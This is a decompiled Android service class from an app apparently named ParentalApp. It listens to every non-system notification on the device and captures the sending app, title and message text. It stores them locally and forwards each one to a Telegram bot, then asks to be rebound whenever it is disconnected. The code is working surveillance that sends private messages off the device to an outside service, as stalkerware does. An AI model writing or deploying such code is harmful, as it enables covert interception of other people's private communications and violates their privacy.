package com.example.services;

import android.content.ComponentName;
import android.content.Context;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import androidx.core.app.NotificationCompat;
import androidx.core.view.MotionEventCompat;
import com.example.ParentalApp;
import com.example.data.local.AppDatabase;
import com.example.data.remote.TelegramBotClient;
import com.example.data.repository.SettingsRepository;
import javax.inject.Inject;
import kotlin.Metadata;
import kotlin.Unit;
import kotlin.coroutines.Continuation;
import kotlin.coroutines.jvm.internal.DebugMetadata;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlin.jvm.functions.Function2;
import kotlin.jvm.internal.Intrinsics;
import kotlin.text.StringsKt;
import kotlinx.coroutines.BuildersKt__Builders_commonKt;
import kotlinx.coroutines.CoroutineScope;
import kotlinx.coroutines.CoroutineScopeKt;
import kotlinx.coroutines.Dispatchers;
import kotlinx.coroutines.Job;
import kotlinx.coroutines.SupervisorKt;

/* JADX INFO: compiled from: ParentNotificationListener.kt */
/* JADX INFO: loaded from: classes5.dex */
@Metadata(d1 = {"\u0000:\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0002\b\u0005\n\u0002\u0018\u0002\n\u0002\b\u0005\n\u0002\u0018\u0002\n\u0002\b\u0005\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0002\b\u0003\b\u0007\u0018\u00002\u00020\u0001B\u0007¢\u0006\u0004\b\u0002\u0010\u0003J\b\u0010\u0018\u001a\u00020\u0019H\u0016J\u0010\u0010\u001a\u001a\u00020\u00192\u0006\u0010\u001b\u001a\u00020\u001cH\u0016J\u0010\u0010\u001d\u001a\u00020\u00192\u0006\u0010\u001b\u001a\u00020\u001cH\u0016J\b\u0010\u001e\u001a\u00020\u0019H\u0016R\u001e\u0010\u0004\u001a\u00020\u00058\u0006@\u0006X\u0087.¢\u0006\u000e\n\u0000\u001a\u0004\b\u0006\u0010\u0007\"\u0004\b\b\u0010\tR\u001e\u0010\n\u001a\u00020\u000b8\u0006@\u0006X\u0087.¢\u0006\u000e\n\u0000\u001a\u0004\b\f\u0010\r\"\u0004\b\u000e\u0010\u000fR\u001e\u0010\u0010\u001a\u00020\u00118\u0006@\u0006X\u0087.¢\u0006\u000e\n\u0000\u001a\u0004\b\u0012\u0010\u0013\"\u0004\b\u0014\u0010\u0015R\u000e\u0010\u0016\u001a\u00020\u0017X\u0082\u0004¢\u0006\u0002\n\u0000¨\u0006\u001f"}, d2 = {"Lcom/example/services/ParentNotificationListener;", "Landroid/service/notification/NotificationListenerService;", "<init>", "()V", "telegramClient", "Lcom/example/data/remote/TelegramBotClient;", "getTelegramClient", "()Lcom/example/data/remote/TelegramBotClient;", "setTelegramClient", "(Lcom/example/data/remote/TelegramBotClient;)V", "db", "Lcom/example/data/local/AppDatabase;", "getDb", "()Lcom/example/data/local/AppDatabase;", "setDb", "(Lcom/example/data/local/AppDatabase;)V", "settings", "Lcom/example/data/repository/SettingsRepository;", "getSettings", "()Lcom/example/data/repository/SettingsRepository;", "setSettings", "(Lcom/example/data/repository/SettingsRepository;)V", "scope", "Lkotlinx/coroutines/CoroutineScope;", "onCreate", "", "onNotificationPosted", "sbn", "Landroid/service/notification/StatusBarNotification;", "onNotificationRemoved", "onListenerDisconnected", "app"}, k = 1, mv = {2, 2, 0}, xi = 48)
public final class ParentNotificationListener extends NotificationListenerService {
    public static final int $stable = 8;

    @Inject
    public AppDatabase db;
    private final CoroutineScope scope = CoroutineScopeKt.CoroutineScope(Dispatchers.getIO().plus(SupervisorKt.SupervisorJob$default((Job) null, 1, (Object) null)));

    @Inject
    public SettingsRepository settings;

    @Inject
    public TelegramBotClient telegramClient;

    public final TelegramBotClient getTelegramClient() {
        TelegramBotClient telegramBotClient = this.telegramClient;
        if (telegramBotClient != null) {
            return telegramBotClient;
        }
        Intrinsics.throwUninitializedPropertyAccessException("telegramClient");
        return null;
    }

    public final void setTelegramClient(TelegramBotClient telegramBotClient) {
        Intrinsics.checkNotNullParameter(telegramBotClient, "<set-?>");
        this.telegramClient = telegramBotClient;
    }

    public final AppDatabase getDb() {
        AppDatabase appDatabase = this.db;
        if (appDatabase != null) {
            return appDatabase;
        }
        Intrinsics.throwUninitializedPropertyAccessException("db");
        return null;
    }

    public final void setDb(AppDatabase appDatabase) {
        Intrinsics.checkNotNullParameter(appDatabase, "<set-?>");
        this.db = appDatabase;
    }

    public final SettingsRepository getSettings() {
        SettingsRepository settingsRepository = this.settings;
        if (settingsRepository != null) {
            return settingsRepository;
        }
        Intrinsics.throwUninitializedPropertyAccessException("settings");
        return null;
    }

    public final void setSettings(SettingsRepository settingsRepository) {
        Intrinsics.checkNotNullParameter(settingsRepository, "<set-?>");
        this.settings = settingsRepository;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        Context applicationContext = getApplicationContext();
        Intrinsics.checkNotNull(applicationContext, "null cannot be cast to non-null type com.example.ParentalApp");
        ((ParentalApp) applicationContext).getAppComponent().inject(this);
    }

    @Override // android.service.notification.NotificationListenerService
    public void onNotificationPosted(StatusBarNotification sbn) {
        String appName;
        String string;
        Intrinsics.checkNotNullParameter(sbn, "sbn");
        if (!getSettings().isMonitoringActive() || (appName = sbn.getPackageName()) == null || Intrinsics.areEqual(appName, "android") || Intrinsics.areEqual(appName, "com.android.systemui")) {
            return;
        }
        String title = sbn.getNotification().extras.getString(NotificationCompat.EXTRA_TITLE);
        String text = "";
        if (title == null) {
            title = "";
        }
        CharSequence charSequence = sbn.getNotification().extras.getCharSequence(NotificationCompat.EXTRA_TEXT);
        if (charSequence != null && (string = charSequence.toString()) != null) {
            text = string;
        }
        if (StringsKt.isBlank(title) && StringsKt.isBlank(text)) {
            return;
        }
        String summary = "🔔 <b>Notification: " + appName + "</b>\n<b>Title:</b> " + title + "\n<b>Text:</b> " + text;
        BuildersKt__Builders_commonKt.launch$default(this.scope, null, null, new AnonymousClass1(summary, null), 3, null);
    }

    /* JADX INFO: renamed from: com.example.services.ParentNotificationListener$onNotificationPosted$1, reason: invalid class name */
    /* JADX INFO: compiled from: ParentNotificationListener.kt */
    @Metadata(d1 = {"\u0000\n\n\u0000\n\u0002\u0010\u0002\n\u0002\u0018\u0002\u0010\u0000\u001a\u00020\u0001*\u00020\u0002H\n"}, d2 = {"<anonymous>", "", "Lkotlinx/coroutines/CoroutineScope;"}, k = 3, mv = {2, 2, 0}, xi = 48)
    @DebugMetadata(c = "com.example.services.ParentNotificationListener$onNotificationPosted$1", f = "ParentNotificationListener.kt", i = {}, l = {MotionEventCompat.AXIS_GENERIC_13, 48}, m = "invokeSuspend", n = {}, s = {})
    static final class AnonymousClass1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ String $summary;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        AnonymousClass1(String str, Continuation<? super AnonymousClass1> continuation) {
            super(2, continuation);
            this.$summary = str;
        }

        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return ParentNotificationListener.this.new AnonymousClass1(this.$summary, continuation);
        }

        @Override // kotlin.jvm.functions.Function2
        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return ((AnonymousClass1) create(coroutineScope, continuation)).invokeSuspend(Unit.INSTANCE);
        }

        /* JADX WARN: Removed duplicated region for block: B:17:0x005d A[RETURN] */
        @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct code enable 'Show inconsistent code' option in preferences
        */
        public final java.lang.Object invokeSuspend(java.lang.Object r11) {
            /*
                r10 = this;
                java.lang.Object r0 = kotlin.coroutines.intrinsics.IntrinsicsKt.getCOROUTINE_SUSPENDED()
                int r1 = r10.label
                switch(r1) {
                    case 0: goto L1b;
                    case 1: goto L17;
                    case 2: goto L11;
                    default: goto L9;
                }
            L9:
                java.lang.IllegalStateException r0 = new java.lang.IllegalStateException
                java.lang.String r1 = "call to 'resume' before 'invoke' with coroutine"
                r0.<init>(r1)
                throw r0
            L11:
                kotlin.ResultKt.throwOnFailure(r11)     // Catch: java.lang.Exception -> L15
                goto L5e
            L15:
                r0 = move-exception
                goto L5f
            L17:
                kotlin.ResultKt.throwOnFailure(r11)
                goto L45
            L1b:
                kotlin.ResultKt.throwOnFailure(r11)
                com.example.services.ParentNotificationListener r1 = com.example.services.ParentNotificationListener.this
                com.example.data.local.AppDatabase r1 = r1.getDb()
                com.example.data.local.LogDao r1 = r1.logDao()
                com.example.data.local.LogEntity r2 = new com.example.data.local.LogEntity
                long r4 = java.lang.System.currentTimeMillis()
                java.lang.String r7 = r10.$summary
                r8 = 1
                r9 = 0
                r3 = 0
                java.lang.String r6 = "notification"
                r2.<init>(r3, r4, r6, r7, r8, r9)
                r3 = r10
                kotlin.coroutines.Continuation r3 = (kotlin.coroutines.Continuation) r3
                r4 = 1
                r10.label = r4
                java.lang.Object r1 = r1.insertLog(r2, r3)
                if (r1 != r0) goto L45
                return r0
            L45:
                com.example.services.ParentNotificationListener r1 = com.example.services.ParentNotificationListener.this     // Catch: java.lang.Exception -> L15
                com.example.data.remote.TelegramBotClient r2 = r1.getTelegramClient()     // Catch: java.lang.Exception -> L15
                java.lang.String r3 = r10.$summary     // Catch: java.lang.Exception -> L15
                r5 = r10
                kotlin.coroutines.Continuation r5 = (kotlin.coroutines.Continuation) r5     // Catch: java.lang.Exception -> L15
                r1 = 2
                r10.label = r1     // Catch: java.lang.Exception -> L15
                r4 = 0
                r6 = 2
                r7 = 0
                java.lang.Object r1 = com.example.data.remote.TelegramBotClient.sendMessage$default(r2, r3, r4, r5, r6, r7)     // Catch: java.lang.Exception -> L15
                if (r1 != r0) goto L5e
                return r0
            L5e:
                goto L62
            L5f:
                r0.printStackTrace()
            L62:
                kotlin.Unit r0 = kotlin.Unit.INSTANCE
                return r0
            */
            throw new UnsupportedOperationException("Method not decompiled: com.example.services.ParentNotificationListener.AnonymousClass1.invokeSuspend(java.lang.Object):java.lang.Object");
        }
    }

    @Override // android.service.notification.NotificationListenerService
    public void onNotificationRemoved(StatusBarNotification sbn) {
        Intrinsics.checkNotNullParameter(sbn, "sbn");
    }

    @Override // android.service.notification.NotificationListenerService
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        NotificationListenerService.requestRebind(new ComponentName(this, (Class<?>) ParentNotificationListener.class));
    }
}
